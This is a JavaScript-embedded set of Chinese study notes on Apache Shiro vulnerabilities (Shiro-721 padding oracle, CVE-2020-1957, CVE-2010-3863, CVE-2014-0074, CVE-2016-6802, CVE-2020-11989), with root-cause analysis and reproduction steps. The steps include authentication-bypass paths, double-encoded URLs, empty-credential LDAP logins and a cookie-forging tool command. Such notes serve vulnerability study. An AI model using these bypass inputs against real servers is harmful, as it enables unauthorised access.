                                              java -jar PaddingOracleAttack.jar <\u76EE\u6807\u7F51\u5740> <rememberMe\u7684Cookie\u503C> <block\u5757\u7684\u5927\u5C0F> <Payload\u6587\u4EF6\u7684\u8DEF\u5F84>
                              3\u3001\u5982\u679C\u7206\u7834\u6210\u529F\uFF0C\u5219\u4F1A\u8F93\u51FAResult\uFF1A
                                      xxxxxx
                      4\u3001\u4F7F\u7528\u6784\u9020\u7684\u300ArememberMe\u653B\u51FB\u5B57\u7B26\u4E32\u300B\u91CD\u65B0\u8BF7\u6C42\u7F51\u7AD9\u3002\u6784\u9020\u6570\u636E\u5305\uFF0C\u4F2A\u9020cookie\uFF0C\u53D1\u9001Payload\uFF1A
                              1\u3001\u5C06\u5176\u586B\u5165  \u8BF7\u6C42\u5934\u7684Cookie  \u4E2D\u7684\u300ArememberMe\u300B\u5B57\u6BB5\u3002
                      5\u3001\u6210\u529F\u89E6\u53D1Payload
                              1\u3001\u5982\u679C\u6211\u4EEC\u6700\u521D \u6784\u9020\u7684\u662F DnsLog\u8BF7\u6C42\u4EE3\u7801\uFF0C\u5219\u6700\u7EC8\uFF0C\u4F1A\u5728 DNSLog \u83B7\u53D6\u5230\u76EE\u6807IP\u3002



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08Shiro-682\uFF09     \uFF08 CVE-2020-1957 \u3001 CNVD-2020-20984 \uFF09",`


      Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08Shiro-682\uFF09     \uFF08 CVE-2020-1957 \u3001 CNVD-2020-20984 \uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      Shiro < 1.5.2

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001xxx
                      2\u3001\u7C7B\u4F3C\u7684\u6F0F\u6D1E\u8FD8\u6709CVE-2020-11989\u3001CVE-2020-13933\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001Shiro\u6846\u67B6\u4F7F\u7528\u62E6\u622A\u5668\u5BF9\u7528\u6237\u8BBF\u95EE\u6743\u9650\u8FDB\u884C\u63A7\u5236\uFF0C\u5E38\u89C1\u7684\u6709\u5982anon\u3001authc\u7B49\u62E6\u622A\u5668\u3002
                              1\u3001anon\u62E6\u622A\u5668\u4E3A\u533F\u540D\u62E6\u622A\u5668\uFF0C\u65E0\u9700\u767B\u9646\u5373\u53EF\u8FDB\u884C\u8BBF\u95EE\uFF0C\u4E00\u822C\u7528\u4E8E\u9759\u6001\u8D44\u6E90\u3002
                              2\u3001authc\u4E3A\u767B\u9646\u62E6\u622A\u5668\uFF0C\u9700\u8981\u767B\u9646\u624D\u53EF\u4EE5\u8BBF\u95EE\u3002
                      2\u3001\u7528\u6237\u53EF\u4EE5\u5728 \u300AShiro.ini\u300B \u7F16\u5199\u5339\u914DURL\u914D\u7F6E\uFF0C\u5C06\u4F1A\u62E6\u622A\u5339\u914D\u7684URL\uFF0C\u5E76\u6267\u884C\u54CD\u5E94\u7684\u62E6\u622A\u5668\u3002\u4ECE\u800C\u5B9E\u73B0\u5BF9URL\u7684\u8BBF\u95EE\u63A7\u5236\uFF0C
                              1\u3001URL\u8DEF\u5F84\u8868\u8FBE\u5F0F\u901A\u5E38\u4E3AANT\u683C\u5F0F\u3002
                                      1\u3001\u5373\u8BBF\u95EE/index\u65F6\u65E0\u9700\u767B\u9646\uFF0C\u800C\u8BBF\u95EE/user/test\u65F6\u9700\u8981\u767B\u9646\u8BA4\u8BC1\u3002
                              2\u3001\u683C\u5F0F\u4ECB\u7ECD
                                      #Shiro.ini
                                      /index = anon
                                      /user/** = authc
                                      ------
                                      Ant\u683C\u5F0F:
                                      ?\uFF1A\u5339\u914D\u4E00\u4E2A\u5B57\u7B26
                                      *\uFF1A\u5339\u914D\u96F6\u4E2A\u6216\u591A\u4E2A\u5B57\u7B26\u4E32
                                      **\uFF1A\u5339\u914D\u8DEF\u5F84\u4E2D\u7684\u96F6\u4E2A\u6216\u591A\u4E2A\u8DEF\u5F84
                              3\u3001\u8FD9\u91CC\u7684/**\u53EF\u4EE5\u5339\u914D\u4EFB\u610F\u8DEF\u5F84\uFF0C\u5373\u53EF\u4EE5\u5339\u914D\u5230/user/test/\uFF0C
                              2\u3001\u800C/*\u53EA\u80FD\u5339\u914D\u5230\u5355\u4E2A\u6216\u591A\u4E2A\u5B57\u7B26\u4E32\uFF0C\u5373/user/test\u3002
                                      1\u3001\u90A3\u4E48\u5047\u8BBE\u914D\u7F6E\u5185\u6539\u4E3A\uFF1A/user/* = authc\uFF0C\u5219\u53EF\u4EE5\u5339\u914D\u5230/user/test\u3001\u4F46\u65E0\u6CD5\u5339\u914D\u5230/user/test/\uFF08\u591A\u4E86\u4E2A\u659C\u6746\uFF09\uFF0C
                                              1\u3001\u90A3\u4E48\u5C31\u4F1A\u653E\u884C/user/test/\u3002\u7136\u540E\u8FDB\u5165\u5230Spring(Servlet)\u62E6\u622A\u5668\u4E2D\uFF0C
                                              2\u3001\u5BF9\u4E8ESpring\uFF0C\u4E0A\u8FF0\u4E24\u4E2A\u8DEF\u5F84\u90FD\u662F\u4E00\u81F4\u7684\uFF0C\u4E8E\u662F\u5C31\u9020\u6210\u4E86\u6743\u9650\u7ED5\u8FC7\u3002

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u6F0F\u6D1E\u73AF\u5883\u642D\u5EFA\uFF1A
                              \u7565
                      2\u3001\u6F0F\u6D1E\u590D\u73B0\uFF1A
                              1\u3001\u8BBF\u95EE/hello/1\uFF0C\u8FD4\u56DE302
                                      1\u3001\u53D7\u5230\u6743\u9650\u9650\u5236\uFF0C\u8FD4\u56DE302\u91CD\u5B9A\u5411\u4FE1\u606F
                              2\u3001\u8BBF\u95EE/hello/1/\uFF0C\u8FD4\u56DE200
                                      1\u3001\u6210\u529F\u7ED5\u8FC7authc\u62E6\u622A\u5668
                              3\u3001\u9664\u6B64\u4E4B\u5916\uFF0C\u8FD8\u53EF\u4EE5\u4F7F\u7528\u4E0B\u9762\u7684payload
                                      /abcd;/../hello/1


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u4E00\u952E\u81EA\u52A8\u5316\u6F0F\u6D1E\u5229\u7528\u5DE5\u5177\u300AShiroExploit\u300B  \uFF08\u9488\u5BF9 Shiro550\u3001Shiro721\uFF09",`

      \u4E00\u952E\u81EA\u52A8\u5316\u6F0F\u6D1E\u5229\u7528\u5DE5\u5177\u300AShiroExploit\u300B  \uFF08\u9488\u5BF9 Shiro550\u3001Shiro721\uFF09
              \u4ED3\u5E93\u5730\u5740\uFF1A
                      Github\u9879\u76EE\u5730\u5740\uFF1Ahttps://github.com/feihong-cs/ShiroExploit
              \u4ECB\u7ECD\uFF1A
                      ShiroExploit\uFF1A\u652F\u6301\u5BF9Shiro-550\uFF08\u786C\u7F16\u7801\u79D8\u94A5\uFF09\u548CShiro-721\uFF08Padding Oracle\uFF09\u7684\u4E00\u952E\u5316\u68C0\u6D4B\uFF0C\u652F\u6301\u7B80\u5355\u56DE\u663E\u3002
              \u4F7F\u7528\uFF1A
                      1\u3001Shiro-550\uFF0C\u53EA\u9700\u8F93\u5165url\uFF0C\u5373\u53EF\u5B8C\u6210\u81EA\u52A8\u5316\u68C0\u6D4B\u548C\u6F0F\u6D1E\u5229\u7528\u3002
                      2\u3001Shiro-721\uFF0C\u9700\u8F93\u5165url\uFF0C\u63D0\u4F9B\u4E00\u4E2A\u6709\u6548\u7684rememberMe Cookie\uFF0C\u5E76\u6307\u5B9A\u76EE\u6807\u64CD\u4F5C\u7CFB\u7EDF\u7C7B\u578B\u3002
                              1\u3001\u7136\u540E\uFF0C\u5B8C\u6210\u81EA\u52A8\u5316\u68C0\u6D4B\u548C\u6F0F\u6D1E\u5229\u7528\u3002



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2010-3863\uFF09\uFF08CNVD-2010-2715\uFF09",`

      Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2010-3863\uFF09\uFF08CNVD-2010-2715\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      shiro < 1.1.0 \u548C JSecurity 0.9.x
              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001Shiro\u8FDB\u884C\u6743\u9650\u9A8C\u8BC1\u524D\u672A\u8FDB\u884C\u8DEF\u5F84\u6807\u51C6\u5316\uFF0C\u5BFC\u81F4\u4F7F\u7528\u65F6\u53EF\u80FD\u7ED5\u8FC7\u6743\u9650\u6821\u9A8C

              \u539F\u7406\u5206\u6790
                      1\u3001\u5148\u5206\u6790\u4E00\u4E0BShiro\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u6D41\u7A0B\uFF1AShiro\u4F7F\u7528 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain \u65B9\u6CD5\u83B7\u53D6\u548C\u8C03\u7528\u8981\u6267\u884C\u7684 Filter\uFF0C\u903B\u8F91\u5982\u4E0B\uFF1A
                              1\u3001\u5728getPathWithinApplication()\u65B9\u6CD5\u4E2D\u8C03\u7528 WebUtils.getPathWithinApplication()\u65B9\u6CD5\uFF0C\u7528\u6765\u83B7\u53D6\u8BF7\u6C42\u8DEF\u5F84\u3002
                                      1\u3001\u5176\u4E2DgetContextPath(request)\u65B9\u6CD5\u83B7\u53D6 Context \u8DEF\u5F84
                                      2\u3001getRequestUri(request) \u65B9\u6CD5\u83B7\u53D6URI \u7684\u503C\uFF0C\u5E76\u8C03\u7528 decodeAndCleanUriString() \u5904\u7406\u3002
                                              1\u3001\u5728decodeAndCleanUriString()\u4E2D\u5BF9 \u300A;\u300B \u8FDB\u884C\u4E86\u622A\u53D6\u3002
                      2\u3001\u6B64\u65F6contextPath\u503C\u4E3A /samples_web_war \uFF0CrequestUri\u503C\u4E3A /samples_web_war/login.jsp
                              1\u3001\u7136\u540E\u5224\u65ADrequestUri\u662F\u5426\u4EE5contextPath\u5F00\u59CB\uFF0C\u662F\u7684\u8BDD\u5C06\u5176\u66FF\u6362\u4E3A/
                      3\u3001\u5904\u7406\u4E4B\u540E\u7684\u8BF7\u6C42 URL \u5C06\u4F1A\u4F7F\u7528 AntPathMatcher#doMatch \u8FDB\u884C\u6743\u9650\u9A8C\u8BC1\u3002
                      4\u3001\u6B64\u65F6\u53D1\u73B0\uFF0CShiro\u4E2D\u5BF9URI\u5E76\u6CA1\u6709\u8FDB\u884C\u8DEF\u5F84\u7684\u6807\u51C6\u5316\u5904\u7406\uFF0C\u8FD9\u6837\u5F53URI\u4E2D\u5B58\u5728\u7279\u6B8A\u5B57\u7B26\u65F6\uFF0C\u5C31\u5B58\u5728\u7ED5\u8FC7\u98CE\u9669

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u642D\u5EFA\u6F0F\u6D1E\u73AF\u5883\u3002
                              1\u3001\u8BBE\u7F6E\u914D\u7F6E\u6587\u4EF6 \u300Ashiro.ini\u300B \uFF1A
                                      [urls]
                                      /login.jsp = authc
                                      /logout = logout
                                      /account/** = authc
                                      /remoting.jsp = authc, perms["audit:list"]
                                      /** = anon
                      2\u3001\u6709\u4E86\u4E0A\u9762\u7684\u914D\u7F6E\uFF0C\u76F4\u63A5\u8BBF\u95EE\uFF1A\u300A/remoting.jsp\u300B \uFF0C\u4F1A\u56E0\u4E3A\u6CA1\u6709\u6743\u9650\u800C\u8DF3\u8F6C\u81F3\u767B\u9646\u754C\u9762\u3002
                      3\u3001\u5F53\u8BBF\u95EE \u300A/./remoting.jsp\u300B \uFF0C\u7531\u4E8E\u5176\u4E0D\u80FD\u4E0E\u914D\u7F6E\u6587\u4EF6\u5339\u914D\uFF0C\u5BFC\u81F4\u8FDB\u5165\u4E86 /** \u7684\u5339\u914D\u8303\u56F4\uFF0C\u5BFC\u81F4\u53EF\u4EE5\u8D8A\u6743\u8BBF\u95EE\u3002

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro \u8EAB\u4EFD\u9A8C\u8BC1\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2014-0074\uFF09",`


      Apache Shiro \u8EAB\u4EFD\u9A8C\u8BC1\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2014-0074\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      shiro 1.x \uFF0C \u4E14< 1.2.3

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u5F53\u7A0B\u5E8F\u4F7F\u7528LDAP\u670D\u52A1\u5668\u3001\u5E76\u542F\u7528\u975E\u8EAB\u4EFD\u9A8C\u8BC1\u7ED1\u5B9A\u65F6\uFF0C\u8FDC\u7A0B\u653B\u51FB\u8005\u53EF\u501F\u52A9\u7A7A\u7684\u7528\u6237\u540D\u6216\u5BC6\u7801\u5229\u7528\u8BE5\u6F0F\u6D1E\u7ED5\u8FC7\u8EAB\u4EFD\u9A8C\u8BC1\u3002
                      2\u3001\u6F0F\u6D1E\u672C\u8D28\u4E0A\u5E94\u8BE5\u662F ldap \u7684\u914D\u7F6E\u95EE\u9898\uFF0C
                              1\u3001\u5E76\u4E0D\u5E94\u4F5C\u4E3A Shiro \u7684\u5B89\u5168\u6F0F\u6D1E\u88AB\u5217\u4E3E\u51FA\u6765\uFF0C\u56E0\u4E3A\u4E0D\u540C\u673A\u5236\u7684\u5B9E\u73B0\u80AF\u5B9A\u6709\u5DEE\u5F02\u3002
                              2\u3001\u4F46\u5B98\u65B9\u8FD8\u662F\u51FA\u4E86\u66F4\u65B0\u8865\u4E01\uFF0C\u751A\u81F3\u7ED9\u4E86 CVE\uFF0C\u5F88\u8BA9\u4EBA\u8D39\u89E3\u3002
                      3\u3001\u8FD9\u4E24\u79CD\u5747\u662F Shiro \u5224\u65AD\u673A\u5236\u548C ldap \u914D\u7F6E\u4E4B\u95F4\u51B2\u7A81\u5BFC\u81F4\u7684\u95EE\u9898\uFF0C
                              1\u3001\u4F46\u662F shiro \u5E76\u672A\u4FEE\u590D\u8FD9\u4E24\u79CD\u60C5\u51B5\uFF0C\u800C\u4FEE\u590D\u7684\u662F\u6709\u7528\u6237\u540D\u4F46\u662F\u5BC6\u7801\u662F\u7A7A\u7684\u60C5\u51B5\uFF0C
                                      1\u3001\u8FD9\u79CD\u673A\u5236\u5728 ldap \u4E2D\u4E0D\u53EB UnAuthenticated\uFF08\u672A\u8BA4\u8BC1\uFF09\uFF0C\u5B9E\u9645\u53EB\u505A Pass-Through Authentication\uFF08\u8BA4\u8BC1\u7ED5\u8FC7\uFF09\u3002
                                              1\u3001LDAP \u670D\u52A1\u5668\u5728\u5F00\u542F\u4E86\u76F8\u5173\u914D\u7F6E\u540E\uFF0C\u5141\u8BB8\u901A\u8FC7\u7528\u6237\u540D+\u7A7A\u5BC6\u7801/\u9519\u8BEF\u5BC6\u7801\u7684\u65B9\u5F0F\u6765\u7ECF\u8FC7\u8BA4\u8BC1\u3002

              \u539F\u7406\u5206\u6790

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001BUG \u63D0\u4EA4\u8005\u4E00\u5171\u63D0\u51FA\u4E86\u4E24\u4E2A\u573A\u666F\uFF0C\u4E00\u4E2A\u662F\u7A7A\u8D26\u6237\u52A0\u7A7A\u5BC6\u7801\u7ED5\u8FC7\uFF0C\u4E00\u4E2A\u662F\u7A7A\u8D26\u6237\u52A0\u4EFB\u610F\u5BC6\u7801\u7ED5\u8FC7\u3002
                      2\u3001\u7B2C\u4E00\u4E2A\u573A\u666F\uFF1A
                              1\u3001\u573A\u666F 1 \u662F\u5F53 ldap \u670D\u52A1\u5668\u5141\u8BB8\u533F\u540D\u8BBF\u95EE\uFF08Anonymous\uFF09\u65F6\uFF0C\u53EF\u4EE5\u4F7F\u7528\u7A7A\u7528\u6237\u548C\u7A7A\u5BC6\u7801\u767B\u5F55\uFF0C\u590D\u73B0\u5982\u4E0B\u3002
                                      1\u3001\u9996\u5148\u8BBF\u95EE /login \u63A5\u53E3\u767B\u9646\uFF0C\u5728\u642D\u5EFA\u7684\u6D4B\u8BD5\u73AF\u5883\u4E2D\uFF0C\u8BBF\u95EE\u94FE\u63A5\uFF1Ahttp://localhost:8080/login?username=cn=test,dc=su18,dc=org&password=test\uFF0C
                                              1\u3001\u6210\u529F\u767B\u9646\u540E\uFF0C\u9875\u9762\u8DF3\u8F6C\u81F3 /user\uFF0C\u663E\u793A\u8BA4\u8BC1\u540E\u624D\u4F1A\u770B\u5230\u7684\u9875\u9762\uFF0C\u5E76\u6253\u5370\u51FA\u4E86\u5F53\u524D\u7528\u6237\u7684 principal\u3002
                                              2\u3001\u6B64\u65F6\u4E00\u5207\u8BA4\u8BC1\u72B6\u6001\u6B63\u5E38\u3002\u968F\u540E\u8BBF\u95EE /logout \u63A5\u53E3\u767B\u51FA\uFF0C\u9875\u9762\u8DF3\u8F6C\u56DE /login \u767B\u9646\u9875\u9762\u3002
                                      2\u3001\u63A5\u4E0B\u6765\u5C31\u662F\u89C1\u8BC1\u5947\u8FF9\u7684\u65F6\u523B\uFF0C
                                              1\u3001\u518D\u6B21\u5C1D\u8BD5\u767B\u9646\uFF0C\u4F7F\u7528\u7A7A\u7528\u6237\u540D\u53CA\u7A7A\u5BC6\u7801\uFF0C\u8BBF\u95EE\u94FE\u63A5\uFF1Ahttp://localhost:8080/login?username=&password=\uFF0C
                                                      1\u3001\u53D1\u73B0\u6210\u529F\u8BA4\u8BC1\uFF0C\u9875\u9762\u8DF3\u8F6C\u81F3 /user\uFF0C\u53EF\u4EE5\u8BBF\u95EE\u5230\u9700\u8981\u8BA4\u8BC1\u624D\u5C55\u793A\u7684\u9875\u9762\uFF0C
                                                      2\u3001\u800C SecurityUtils.getSubject().getPrincipal() \u7684\u7ED3\u679C\u4E3A ""\u3002
                                              2\u3001\u5176\u4ED6\u9700\u8981\u8BA4\u8BC1\u7684\u9875\u9762\u4E5F\u53EF\u4EE5\u76F4\u63A5\u8BBF\u95EE\uFF0C\u5982 /admin\u3002
                      3\u3001\u7B2C\u4E8C\u4E2A\u573A\u666F\uFF1A
                              1\u3001\u9996\u5148\uFF0C\u786E\u4FDD  \u6F0F\u6D1E\u590D\u73B0\u73AF\u5883 ldap \u7684\u914D\u7F6E\u6587\u4EF6\uFF0C\u5F00\u542F\u300A\u672A\u6388\u6743bind\u300B\uFF1A
                                      xxxxxx
                              2\u3001\u63A5\u4E0B\u6765\u4F7F\u7528\u7A7A\u7528\u6237\u540D+\u4EFB\u610F\u5BC6\u7801\u7684\u7EC4\u5408\u5C1D\u8BD5\u767B\u9646\uFF0C\u8BBF\u95EE\u94FE\u63A5\uFF1Ahttp://localhost:8080/login?username=&password=123\uFF0C
                                      1\u3001\u53D1\u73B0\u540C\u6837\u4F1A\u6210\u529F\u767B\u9646\uFF0C\u9875\u9762\u8DF3\u8F6C\u81F3 /user\uFF0C\u540C\u6837 principal \u4E3A\u7A7A\u5B57\u7B26\u4E32\u3002


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro \u8EAB\u4EFD\u9A8C\u8BC1\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2016-6802\uFF09",`


      Apache Shiro \u8EAB\u4EFD\u9A8C\u8BC1\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2016-6802\uFF09

              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      shiro < 1.3.2

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001Shiro\u672A\u5BF9ContextPath\u505A\u8DEF\u5F84\u6807\u51C6\u5316\u5BFC\u81F4\u6743\u9650\u7ED5\u8FC7

              \u539F\u7406\u5206\u6790
                      1\u3001\u672C\u6F0F\u6D1E\u7C7B\u4F3C CVE-2010-3863\uFF0C\u4F9D\u65E7\u662F\u8DEF\u5F84\u6807\u51C6\u5316\u5BFC\u81F4\u7684\u95EE\u9898\uFF0C\u4E0D\u8FC7\u4E4B\u524D\u662F\u5728 RequestURI \u4E0A\uFF0C\u672C\u6F0F\u6D1E\u662F\u5728 ContextPath \u4E0A\u3002
                      2\u3001\u4E4B\u524D\u63D0\u5230\uFF0CShiro \u8C03\u7528 WebUtils.getPathWithinApplication() \u65B9\u6CD5\u83B7\u53D6\u8BF7\u6C42\u8DEF\u5F84\u3002\u903B\u8F91\u5982\u4E0B\uFF1A
                              xxxxxx
                              2\u3001\u5176\u4E2D\u8C03\u7528 getContextPath() \u65B9\u6CD5\uFF0C\u83B7\u53D6 contextPath \uFF1B\u8C03\u7528 getRequestUri() \u65B9\u6CD5\uFF0C\u83B7\u53D6 uri \uFF1B
                              3\u3001\u5728getContextPath() \u65B9\u6CD5\u8C03\u7528 decodeRequestString \u8FDB\u884C URLDecode\u3002
                      3\u3001\u7531\u4E8E\u83B7\u53D6\u7684 ContextPath \u6CA1\u6709\u6807\u51C6\u5316\u5904\u7406\uFF0C\u5982\u679C\u51FA\u73B0\u4E00\u4E9B\u7279\u6B8A\u5B57\u7B26\u4F7FContextPath\u4E0E\u5B9E\u9645\u4E0D\u7B26\uFF0C\u90FD\u4F1A\u5BFC\u81F4\u5728 StringUtils.startsWithIgnoreCase() \u65B9\u6CD5\u5224\u65AD\u65F6\u5931\u6548\uFF0C\u76F4\u63A5\u8FD4\u56DE\u5B8C\u6574\u7684RequestURI\u3002

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u6F0F\u6D1E\u590D\u73B0\uFF1A
                              1\u3001\u767B\u5F55\u8D26\u6237lonestarr\uFF0C\u8BE5\u8D26\u6237\u5BF9\u9875\u9762remoting.jsp\u6CA1\u6709\u8BBF\u95EE\u6743\u9650\uFF0C
                                      1\u3001\u5728 \u300A\u6839\u8DEF\u5F84\u300B \u524D\u52A0\u4EFB\u610F\u8DEF\u5F84\uFF0C\u518D\u52A0../\u5373\u53EF\u5B9E\u73B0\u7ED5\u8FC7



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2020-11989\uFF09",`


      Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2020-11989\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      Apache Shiro < 1.5.3

              \u5229\u7528\u6761\u4EF6
                      1\u3001\u4E24\u6B21\u89E3\u7801\u7ED5\u8FC7\uFF0C\u7684\u9650\u5236
                              1\u3001\u8FD9\u4E2A\u573A\u666F\u4E0B\u9700\u8981\u4E00\u4E9B\u9650\u5236\u6761\u4EF6\uFF0C\u9996\u5148\u914D\u7F6E\u6587\u4EF6\u7684ant\u98CE\u683C\u9700\u8981\u662F\u300A*\u300B\u800C\u4E0D\u662F\u300A**\u300B\uFF0C\u6D4B\u8BD5\u53D1\u73B0\uFF0C\u300A?\u300B\u4E5F\u53EF\u4EE5
                              2\u3001\u53E6\u5916 controller \u9700\u8981\u63A5\u6536\u7684 request\u53C2\u6570(@PathVariable) \u7684\u7C7B\u578B\u9700\u8981\u662FString\uFF0C\u5426\u5219\u5C06\u4F1A\u51FA\u9519\u3002
              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u5728Shiro < 1.5.3\u7684\u60C5\u51B5\u4E0B\uFF0C\u5C06Shiro\u4E0ESpring Controller\u4E00\u8D77\u4F7F\u7528\u65F6\uFF0C\u76F8\u5E94\u8BF7\u6C42\u53EF\u80FD\u4F1A\u5BFC\u81F4\u8EAB\u4EFD\u9A8C\u8BC1\u7ED5\u8FC7\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001\u548C\u300ACVE-2020-1957\u300B\u6F0F\u6D1E\uFF0C\u539F\u7406\u76F8\u540C\u3002
                      2\u3001\u9996\u5148\u8981\u6E05\u695AShiro\u652F\u6301 Ant \u98CE\u683C\u7684\u8DEF\u5F84\u8868\u8FBE\u5F0F\u914D\u7F6E\u3002
                              ?  \u2014\u2014\u2014\u2014\u2014\u2014  \u5339\u914D\u4EFB\u4F55\u5355\u5B57\u7B26
                              *  \u2014\u2014\u2014\u2014\u2014\u2014  \u5339\u914D0\u6216\u8005\u4EFB\u610F\u6570\u91CF\u7684\u5B57\u7B26
                              ** \u2014\u2014\u2014\u2014\u2014\u2014  \u5339\u914D0\u6216\u8005\u66F4\u591A\u7684\u76EE\u5F55
                      3\u3001\u6211\u4EEC\u8FD8\u8BB0\u5F97\u4E3A\u4E86\u4FEE\u590DCVE-2020-1957,shiro\u57281.5.2\u7248\u672C\u8FDB\u884C\u4E86\u66F4\u65B0\uFF0C
                              1\u3001\u5C06request.getRequestURI() \u4FEE\u6539\u4E3A request.getContextPath()\u3001request.getServletPath()\u3001request.getPathInfo() \u62FC\u63A5\u6784\u9020uri\u3002
                              2\u3001\u6839\u636E\u7F51\u4E0A\u5E08\u5085\u4EEC\u7684\u603B\u7ED3\uFF0C\u8FD9\u51E0\u4E2A\u65B9\u6CD5\u7684\u5DEE\u5F02\u6027\u5982\u4E0B\uFF1A
                                      request.getRequestURL()\uFF1A            // \u8FD4\u56DE\u5168\u8DEF\u5F84\uFF1B            \uFF08\u7ED3\u5C3E\u662FL\uFF09
                                      request.getRequestURI()\uFF1A            // \u8FD4\u56DE\u9664\u53BBHost\u90E8\u5206\u7684\u8DEF\u5F84\uFF1B  \uFF08\u7ED3\u5C3E\u662FI\uFF09
                                      request.getContextPath()\uFF1A           // \u8FD4\u56DE\u5DE5\u7A0B\u540D\u90E8\u5206\uFF0C\u5982\u679C\u5DE5\u7A0B\u6620\u5C04\u4E3A / \uFF0C\u5219\u8FD4\u56DE\u4E3A\u7A7A\uFF1B
                                      request.getServletPath()\uFF1A           // \u8FD4\u56DE\u9664\u53BBHost\u548C\u5DE5\u7A0B\u540D\u90E8\u5206\u7684\u8DEF\u5F84\uFF1B
                                      request.getPathInfo()\uFF1A              // \u4EC5\u8FD4\u56DE\u4F20\u9012\u5230Servlet\u7684\u8DEF\u5F84\uFF0C\u5982\u679C\u6CA1\u6709\u4F20\u9012\u989D\u5916\u7684\u8DEF\u5F84\u4FE1\u606F\uFF0C\u5219\u6B64\u8FD4\u56DENull\uFF1B
                              3\u3001\u7B2C\u4E00\u6B21\u89E3\u7801\u53D1\u751F\u5728request.getServletPath()
                              4\u3001\u7B2C\u4E8C\u6B21\u89E3\u7801\u53D1\u751F\u5728decodeAndCleanUriString() -> decodeAndCleanUriString() -> decodeRequestString() -> URLDecoder.decode()
                              5\u3001\u56E0\u6B64 org.apache.shiro.web.util.WebUtils#getRequestUri \u8FDB\u884C\u4E86\u4E24\u6B21\u89E3\u7801\uFF0C\u5C06 \u300A/toJsonList/a%25%32%66a\u300B \u89E3\u7801\u6210 \u300A/toJsonList/a/a\u300B
                                      1\u3001\u63A5\u7740\u5C31\u8D70\u5230 org.apache.shiro.util.AntPathMatcher#doMatch \u8FDB\u884C\u6743\u9650\u9A8C\u8BC1\uFF0C\u300A/toJsonList/a/a\u300B \u4E0D\u6EE1\u8DB3\u914D\u7F6E\u4E2D\u7684 \u300AtoJsonList/*\u300B \uFF0C\u56E0\u6B64\u6210\u529F\u7ED5\u8FC7\u3002
                              6\u3001\u4F46\u8FD8\u8981\u770BSpring\u662F\u600E\u4E48\u5BF9\u5176\u8FDB\u884C\u89E3\u6790\u7684
                                      1\u3001\u5728 org.springframework.web.uti.UrlPathHelper#getPathWithinApplication \u4E2D\uFF0C
                                                1\u3001\u5C06url\u89E3\u6790\u4E3A \u300A/toJsonList/a%2fa\u300B \uFF0C
                                                        1\u3001\u8FD9\u6837\u5176\u5B9E\u5C31\u8868\u793A \u300A/toJsonList/{name}\u300B \u4E2D\u7684name\u503C\u4E3A \u300Aa%2fa\u300B \u3002
                      6\u3001\u5206\u6790\u5B8C\u4E4B\u540E\uFF0C \u4E5F\u5C31\u89E3\u91CA\u4E86\u4E3A\u4EC0\u4E48\u4E0B\u9762\u56DB\u79CD\u7EC4\u5408\u53EA\u6709\u524D\u4E24\u7EC4\u53EF\u4EE5\u7ED5\u8FC7\u3002
                              1\u3001\u6D4B\u8BD5\u53D1\u73B0\uFF0C\u4E0B\u9762\u56DB\u79CD\u7EC4\u5408\u53EA\u6709\u524D\u4E24\u7EC4\u53EF\u4EE5\u7ED5\u8FC7\uFF1A
                                      \u300Ayes\u300B
                                      /toJsonList/a%25%32%66a
                                      /toJsonList/%25%32%66

                                      \u300Ano\u300B
                                      /toJsonList/%25%32%66a
                                      /toJsonList/a%25%32%66

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u6F0F\u6D1E\u590D\u73B0\uFF1A
                              1\u3001\u7F16\u5199Controller
                              2\u3001\u914D\u7F6E\u5BF9\u5E94\u7684 \u300Ashiro.ini\u300B
                                      [urls]
                                      /toJsonList/* = authc
                              3\u3001\u6B64\u65F6\u8BF7\u6C42/toJsonList/aaa\u90A3\u4E48\u5C06\u4F1A\u88AB\u7981\u6B62\u3002
                              4\u3001\u4F46\u662F\u8FD9\u91CC\u6211\u4EEC\u53EF\u4EE5\u901A\u8FC7url\u53CC\u7F16\u7801\u7684\u65B9\u5F0F\u6765\u7ED5\u8FC7\u3002
